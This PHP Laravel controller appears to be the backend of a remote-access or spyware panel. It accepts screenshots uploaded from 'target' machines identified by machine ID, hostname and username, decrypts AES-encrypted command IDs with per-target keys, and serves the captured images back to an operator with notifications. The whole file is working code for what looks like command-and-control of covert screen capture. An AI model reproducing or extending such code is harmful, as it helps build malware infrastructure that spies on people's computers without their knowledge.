<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Notification;
use App\Models\Screenshot;
use App\Models\Target;
use Illuminate\Http\Request;

class ScreenshotController extends Controller
{
    public function post(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string',
            'image' => 'required|image|mimes:jpeg,png,jpg',
            'command_id' => 'required|string'
        ]);

        $image = $request->file('image');
        $filename = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
        $image->move(public_path('uploads/screenshot'), $filename);
        $path = 'uploads/screenshot/' . $filename;

        $target = Target::where('machine_id', $data['id'])->first();
        if ($target)
        {
            $record = [
                'target_id' => $data['id'],
                'command_id' => openssl_decrypt(base64_decode($data['command_id']),
                    'AES-256-CBC',
                    $target->key,
                    OPENSSL_RAW_DATA,
                    $target->iv
                    ),
                'path' => base64_encode(openssl_encrypt(
                    $path,
                    'AES-256-cbc',
                    $target->key,
                    OPENSSL_RAW_DATA,
                    $target->iv
                    ))
                ];

            Screenshot::create($record);

            Notification::create([
                'host' => $target->hostname . '\\' . $target->username,
                'action' => 'New screenshot uploaded',
                'read' => false,
                'target_id' => $data['id']
            ]);
        }

        return response()->json([]);
    }

    public function getImages(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if (!$target) 
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'failed',
                'data' => null
            ]);
        }

        $limit = $request->get('limit', 6);
        $images = Screenshot::where('target_id', $data['id'])
            ->select('id', 'path', 'created_at')
            ->orderBy('id', 'desc')
            ->paginate($limit);

        $images->getCollection()->transform(function ($image) use ($target) {
            $image->path = asset(openssl_decrypt(base64_decode($image->path),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            )); 

             return $image;
        });

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $images
        ]);
    }

    public function getImage($id, Request $request)
    {
        $data = $request->validate([
            'target_id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['target_id'])->first();
        if (!$target)
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'Image not found',
                'data' => null
            ]);
        }

        $image = Screenshot::where('target_id', $data['target_id'])
            ->where('id', $id)
            ->select('id', 'path', 'created_at')
            ->first();
        if ($image)
        {
            $image->path = asset(openssl_decrypt(base64_decode($image->path),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            ));

            return response()->json([
                'status' => 'success',
                'message' => 'success',
                'data' => $image
            ]);
        }

        return response()->json([
                'status' => 'failed',
                'message' => 'Image not found',
                'data' => null
            ]);
    }
}
